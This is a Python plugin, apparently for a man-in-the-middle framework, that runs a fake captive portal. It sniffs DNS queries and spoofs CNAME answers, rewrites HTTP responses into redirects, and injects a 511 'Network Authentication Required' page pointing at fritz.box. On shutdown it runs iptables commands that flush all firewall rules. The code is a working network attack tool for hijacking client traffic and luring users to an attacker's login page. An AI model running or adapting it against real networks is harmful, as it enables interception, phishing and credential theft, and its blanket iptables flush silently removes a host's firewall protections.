# Some of this code was stolen from https://jordan-wright.github.io/blog/2013/11/15/wireless-attacks-with-python-part-one-the-airpwn-attack/

import threading
import logging
import sys
import re
from urlparse import urlparse
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
from scapy.all import *

try:
  from configobj import ConfigObj
except:
  sys.exit('[-] configobj library not installed!')

from plugins.plugin import Plugin

#debug
from pprint import pprint


class Portal(Plugin):
    name = 'Portal'
    optname = 'portal'
    desc = 'Captive Portal test plugin'
    version   = "0.1"
    tree_info = ["Captive Portal running"]
    has_opts = True

    def initialize(self, options):
        self.options       = options
        self.ip            = options.ip
        self.mon_interface = options.interface

        self.portal_html   = """ <html>
      <head>
         <title>Network Authentication Required</title>
         <meta http-equiv="refresh"
               content="0; url=https://fritz.box/">
      </head>
      <body>
         <p>You need to <a href="https://fritz.box/">
         authenticate with the local network</a> in order to gain
         access.</p>
      </body>
   </html>"""
        
        #Table for clients not beeing captured
        self.dtable        = {}

        #TODO: IETF Captive-Portal Identification in DHCP: https://tools.ietf.org/html/draft-wkumari-dhc-capport-16
        
        #Block https traffic
        #self._block_traffic()
        
        if options.portalurl:
            #parse url 
            try:
                self.portal_url = urlparse(options.portalurl)
                self.log.debug("Captival portal at {}".format(self.portal_url))
            except Exception, e:
                sys.exit("[-] Error parsing portal url: %s" % e)
        else:
            self.portal_url = False

        try:
            self.aircfg = ConfigObj("./config/portal.cfg")
            #TODO: delete me
            #Here we compile the regexes for faster performance when injecting packets
            for rule in self.aircfg.items():
                rule[1]['match'] = re.compile(r'%s' % rule[1]['match'])
                if 'ignore' in rule[1].keys():
                    rule[1]['ignore'] = re.compile(r'%s' % rule[1]['ignore'])

        except Exception, e:
            sys.exit("[-] Error parsing airpwn config file: %s" % e)

        if False:
            #TODO: if options.portaldns
            t2 = threading.Thread(name='captive_dns_thread', target=self.captive_dns, args=(self.mon_interface,))
            t2.setDaemon(True)
            t2.start()

    def captive_dns(self, iface):
        sniff(filter="udp and port 53", prn=self.dns_callback, iface=iface)

    def dns_callback(self, packet):

        #pprint(packet, indent=2) #DEBUG
        if packet.haslayer(UDP) and packet.haslayer(DNS):
            if self._check_captured(packet[IP].src) \
                    and packet[IP].src != self.ip:

                req_domain = packet[DNS].qd.qname
                #self.log.info("[*] DNSpwn {}".format(req_domain))

                response = packet.copy()
                response.FCfield = 2L
                
                response.src, response.dst = packet.dst, packet.src
                response.sport, response.dport = packet.dport, packet.sport
                # Set the DNS flags
                response[DNS].qr = 1L
                response[DNS].ra = 1L
                response[DNS].ancount = 1
                # Set hostname(CNAME) of captive portal
                if self.portal_url:
                    response[DNS].an = DNSRR(
                        rrname = req_domain,
                        type = 'CNAME',
                        rclass = 'IN',
                        ttl = 1,            #TODO: set TTL to minimal (0?)
                        rdata = self.portal_url.hostname #set to Captive Portal Host or intercept with response
                    )

                # Set IP(A) for the response
                else:
                    return

                    response[DNS].an = DNSRR(
                        rrname = req_domain,
                        type = 'A',
                        rclass = 'IN',
                        ttl = 1,            #TODO: set TTL to minimal (0?)
                        rdata = self.dnspwn
                    )

                del response[IP].chksum
                del response[UDP].chksum
                del response[UDP].len
                response = response.__class__(str(response))

                #pprint(response, indent=2) #DEBUG

                sendp(response, iface=self.mon_interface, verbose=False)
                self.log.info("{} >> Spoofed DNS for {}".format(packet[IP].src, req_domain))

    #def add_options(self, options):
    def options(self, options):
        options.add_argument('--portalurl', type=str, dest='portalurl', help='URL of the captive Portal.')
        #Define CP template

    def responsestatus(self, request, version, code, message):
        hn = request.headers['host']

        if self.portal_url:
            if not self.portal_url.hostname == hn:
                self.log.info("{} setting 302 response header".format(hn))
                #pprint(request, indent=2) #DEBUG

                return {"request": request, "version": version, "code": 302, "message": "Found"}

    def responseheaders(self, response, request):
        ip = response.getClientIP()
        hn = response.getRequestHostname()

        if self.portal_url:
            self.log.info("{} Vs {} ({})".format(self.portal_url.hostname, hn, request.uri))
            if self.portal_url.hostname == hn:
                #TODO: verify Ports
                self.log.info("{} already browsing captive portal at {}".format(ip, response.uri))

                return 
            else:
                #xx
                self.log.info("{} setting location from {}".format(ip, response.uri))
                #pprint(response, indent=2) #DEBUG

                response.headers["Location"] = self.portal_url.geturl()
                return {"response": response, "request": request}

        return 
    """
    """

    def response(self, response, request, data):
        encoding = None
        ip = response.getClientIP()
        hn = response.getRequestHostname()
        self.log.info("{} requesting {}".format(ip, response.uri))
        
        mime = ''
        if 'Content-Type' in response.headers:
            mime = response.headers['Content-Type']

        # discover content encoding
        if "charset" in mime:
            match = re.search('charset=(.*)', mime)
            if match:
                encoding = match.group(1).strip().replace('"', "")
            else:
                try:
                    encoding = chardet.detect(data)["encoding"]
                except:
                    pass
        else:
            try:
                encoding = chardet.detect(data)["encoding"]
            except:
                pass

        # already requesting captive portal
        if self.portal_url:
            if self.portal_url.hostname == hn:
                #FIXME: verify Ports
                self.log.info("{} already browsing captive portal at {}".format(ip, response.uri))
                self.log.info("{}".format(response))

                return 

        #intercept 
        #if self._check_captured(ip) \
        #        and (hn not in self.ip) \
        #        and ("text/html" in mime):
        if self._check_captured(ip) \
                and (hn not in self.ip):
                    
            if self.portal_url:
                self.log.info('{} redirecting from {} to captive portal at "{}"'.format(ip, hn, self.portal_url.geturl()))
                
                if response.code != 302:
                    self.log.info("Setting response code {}".format(response.code))
                    response.code = 302

                for x in response.headers:
                    self.log.info("\t{}: {}".format(x,response.headers[x]))
                    #Remove other headers?
                    if x == 'expires' \
                            or x == 'connection' \
                            or x == 'content-type' \
                            or x == 'content-length' \
                            or x == 'date':
                        del response.headers[x]
                """
                """

                #response.headers = {}
                response.headers["Location"] = self.portal_url.geturl()
                response.headers["Server"] = "Captive Portal"
                response.headers["Pragma"] = "no-cache"
                #response.headers["Content-Type"] = "text/html"
                #response.headers["Content-Length"] = 0

                for x in response.headers:
                    self.log.info("{}: {}".format(x,response.headers[x]))
                data = None
                return {'response': response, 'request':request, 'data': data}
            else:
                #TODO: paste content from CP template
                html = self.portal_html
                data = str(html)

                #https://tools.ietf.org/html/rfc6585#section-6
                response.code = 511
                response.message = "Network Authentication Required"


                self.log.info("{} injecting custom html".format(ip, hn))
                self.log.info("{}".format(response))

                return {'response': response, 'request':request, 'data': data}
        #else:
        #    self.log.info("%s >> not injecting HTTP request for %s" % (response.uri, hn))
        return

    def on_shutdown(self):
        '''This will be called when shutting down'''
        #os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j block')
        os.system('iptables -F && iptables -X && iptables -t nat -F && iptables -t nat -X')
        pass

    def _check_captured(self, ip):
        #only inject once
        self.log.info("{} registered? {}".format(ip, ip in self.dtable))
        return not ip in self.dtable

    def _block_traffic(self):
        self.log.info("Setting up iptables")
        os.system('iptables -A INPUT -p tcp --destination-port 443 -j REJECT')
        

    def _check_walledgarden(self, request):
        return
        
        #https://serverfault.com/questions/679393/captive-portal-popups-the-definitive-guide
        """
        Android / Chromebook:
            clients3.google.com

        iOS 6:
            gsp1.apple.com
            *.akamaitechnologies.com

        iOS 7:
            www.appleiphonecell.com
            www.airport.us
            *.apple.com.edgekey.net
            *.akamaiedge.net
            *.akamaitechnologies.com

        iOS 8/9:
            http://www.apple.com/library/test/success.html
            http://captive.apple.com/hotspot-detect.html

        #https://msdn.microsoft.com/de-de/library/windows/hardware/dn408681.aspx
        Windows
            ipv6.msftncsi.com
            www.msftncsi.com
        """

